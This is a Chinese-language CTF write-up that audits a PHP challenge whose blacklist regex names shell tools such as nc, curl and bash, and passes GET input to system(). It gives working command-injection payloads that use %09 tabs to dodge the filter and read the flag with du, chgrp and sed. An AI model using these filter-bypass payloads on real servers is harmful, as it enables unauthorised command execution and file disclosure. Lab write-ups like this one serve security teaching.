---
title: 记一次CTF拉练-命令执行绕过
tags: CTF
typora-root-url: ../
---

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

<div style="text-align: right"> 小维</div>

#### 前言

这篇文章记述了一次CTF拉练的一道php的白盒审计题...

#### 源码

```php
<?php
highlight_file(__FILE__); //对文件进行语法高亮显示
$filter = '/#|`| |[\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\$|\(\|\)|\[|\]|\{|\}|\>|\<|\?|\'|"|\*|;|\||&|\/|\\\\/is'; #定义黑名单
$cmd = $_GET['cmd']; # get方式传递数据
if(!preg_match($filter, $cmd)){ # 正则匹配并判断传递的数据
    system($cmd."echo 'okkkkkk'"); #执行外部程序，并显示输出
}else{
    die("ohhhhnnnoooooooooo....."); #输出一条消息，并退出当前脚本。
}
?>
```

<!--more-->

![image-20210519155907178](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519155907178.png)

#### 思路解析

首先分析代码, 一开始先定义了一个`filter`过滤了一些bash命令等关键字（这里过滤了大多数常见的命令、符号等），定义了一个`$_GET变量`用于接收来自GET方法的数据，经过匹配`filter`后，如果没有相关关键字则将用户GET传的数据拼接`echo 'okkkkkk'`后执行`system()`函数，如果匹配到相关字眼就输出`ohhhhnnnoooooooooo.....`并退出，所以整道题的核心就是绕过`filter`。

#####  初步想法

利用Linux其他相关可以查找、查看的命令再利用相关分隔符、拼接符等进行来绕过后面的拼接。

##### 本题考点

① 空格绕过

② Linux其他相关可以列目录文件的命令

③ Linux其他相关可以查看文件的命令

#### 解题步骤

##### 方式一

``` 
① 利用 du -a 查看flag文件名
② 利用sed p 查看文件
注: 需要用到%09来绕过空格
# Linux du 命令可参考：https://www.runoob.com/linux/linux-comm-du.html
```

本地模拟环境测试命令

![image-20210519175241095](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175241095.png)

```
# 查看当前目录文件名为this_is_real_real_flag_other_is_fake
https://xxx.xxx.com/?cmd=du%09-a%09.%09
```

![image-20210519175502328](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175502328.png)

```
# 查看this_is_real_real_flag_other_is_fake内容
https://xxx.xxx.com/?cmd=sed%09p%09this_is_real_real_flag_other_is_fake%09
```

![image-20210519162007917](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519162007917.png)

##### 方式二

```
① 利用chgrp -v -R 查看flag文件名
② 利用sed p 查看文件
注: 需要用到%09来绕过空格
# Linux chgrp 命令可参考：https://www.runoob.com/linux/linux-comm-chgrp.html
```

本地模拟环境测试命令

![image-20210519175429396](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519175429396.png)

```
# 查看当前目录文件名为this_is_real_real_flag_other_is_fake
https://xxx.xxx.com/?cmd=chgrp%09-v%09-R%09root%09.%09
```

##### ![image-20210519161927450](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519161927450.png)

```
# 查看this_is_real_real_flag_other_is_fake内容
https://xxx.xxx.com/?cmd=sed%09p%09this_is_real_real_flag_other_is_fake%09
```

![image-20210519162007917](/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20210519162007917.png)

#### 参考

https://www.runoob.com/linux/linux-comm-du.html

https://www.runoob.com/linux/linux-comm-chgrp.html